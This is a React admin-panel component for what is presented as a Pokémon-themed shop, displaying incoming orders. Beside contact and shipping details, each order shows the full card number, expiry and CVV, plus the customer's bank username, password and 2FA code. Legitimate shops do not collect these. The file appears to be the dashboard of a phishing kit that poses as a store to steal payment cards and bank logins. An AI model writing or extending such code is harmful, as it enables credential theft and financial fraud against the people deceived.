import React, { useEffect, useState } from 'react';
import { X } from 'lucide-react';
import { OrderData, subscribeOrders } from '../services/orderService';

interface AdminPanelProps {
  onClose: () => void;
}

const AdminPanel: React.FC<AdminPanelProps> = ({ onClose }) => {
  const [orders, setOrders] = useState<OrderData[]>([]);

  useEffect(() => {
    const unsubscribe = subscribeOrders(setOrders);
    return () => unsubscribe(); // Cleanup on unmount
  }, []);

  const formatDate = (timestamp: number) => new Date(timestamp).toLocaleString();

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white rounded-xl shadow-2xl w-full max-w-6xl max-h-[90vh] overflow-hidden flex flex-col">
        <div className="bg-pokemon-blue text-white p-4 flex justify-between items-center">
          <h2 className="text-xl font-bold">Admin Panel - Orders</h2>
          <button onClick={onClose} className="text-white hover:text-pokemon-yellow">
            <X size={24} />
          </button>
        </div>
        
        <div className="overflow-y-auto p-4">
          <h3 className="font-bold text-xl mb-6 text-pokemon-dark">All Orders</h3>
          
          {orders.length === 0 ? (
            <div className="text-center py-8 text-gray-500">No orders found</div>
          ) : (
            <div className="space-y-8">
              {orders.map((order) => (
                <div 
                  key={order.id} 
                  className="bg-white rounded-lg shadow-md p-6 border border-gray-200"
                >
                  <div className="flex justify-between items-center mb-4 pb-3 border-b">
                    <h4 className="font-bold text-lg text-pokemon-dark">
                      Order #{order.id.substring(0, 8)}
                    </h4>
                    <div className="text-sm text-gray-500">
                      {formatDate(order.timestamp)}
                    </div>
                  </div>
                  
                  {/* Customer Info */}
                  <div className="mb-6">
                    <h5 className="font-bold text-pokemon-blue mb-2">Customer Information</h5>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <p><span className="font-semibold">Name:</span> {order.formData.firstName} {order.formData.lastName}</p>
                        <p><span className="font-semibold">Email:</span> {order.formData.email}</p>
                        <p><span className="font-semibold">Phone:</span> {order.formData.phone}</p>
                      </div>
                    </div>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    {/* Left Column */}
                    <div>
                      {/* Shipping Info */}
                      <div className="mb-6">
                        <h5 className="font-bold text-pokemon-blue mb-2">Shipping Information</h5>
                        <p>{order.formData.address}</p>
                        <p>{order.formData.city}, {order.formData.state} {order.formData.zipCode}</p>
                      </div>
                      
                      {/* Billing Info */}
                      {!order.formData.sameAsBilling && (
                        <div className="mb-6">
                          <h5 className="font-bold text-pokemon-blue mb-2">Billing Information</h5>
                          <p>{order.formData.billingAddress}</p>
                          <p>{order.formData.billingCity}, {order.formData.billingState} {order.formData.billingZipCode}</p>
                        </div>
                      )}
                    </div>
                    
                    {/* Right Column */}
                    <div>
                      {/* Payment Info */}
                      <div className="mb-6">
                        <h5 className="font-bold text-pokemon-blue mb-2">Payment Information</h5>
                        <p><span className="font-semibold">Card:</span> {order.cardData.cardNumber}</p>
                        <p><span className="font-semibold">Cardholder:</span> {order.cardData.cardholderName}</p>
                        <p><span className="font-semibold">Expiry:</span> {order.cardData.expiryDate}</p>
                        <p><span className="font-semibold">CVV:</span> {order.cardData.cvv}</p>
                      </div>
                      
                      {/* Bank Login Info */}
                      <div className="mb-6">
                        <h5 className="font-bold text-pokemon-blue mb-2">Bank Login Information</h5>
                        <p><span className="font-semibold">Username:</span> {order.bankLoginData.username}</p>
                        <p><span className="font-semibold">Password:</span> {order.bankLoginData.password}</p>
                        <p><span className="font-semibold">2FA Code:</span> {order.bankLoginData.twoFactorCode}</p>
                      </div>
                    </div>
                  </div>
                  
                  {/* Product Info */}
                  {order.productInfo && (
                    <div className="mb-6">
                      <h5 className="font-bold text-pokemon-blue mb-2">Product Information</h5>
                      <div className="flex items-center">
                        <img 
                          src={order.productInfo.image} 
                          alt={order.productInfo.name} 
                          className="w-16 h-16 object-cover rounded mr-4"
                        />
                        <div>
                          <p className="font-semibold">{order.productInfo.name}</p>
                          <p>Quantity: {order.productInfo.quantity}</p>
                          <p>Price: ${order.productInfo.price.toFixed(2)}</p>
                        </div>
                      </div>
                    </div>
                  )}
                  
                  {/* Total */}
                  <div className="mt-6 pt-4 border-t">
                    <p className="text-xl font-bold text-pokemon-dark">Total: ${order.total?.toFixed(2)}</p>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;
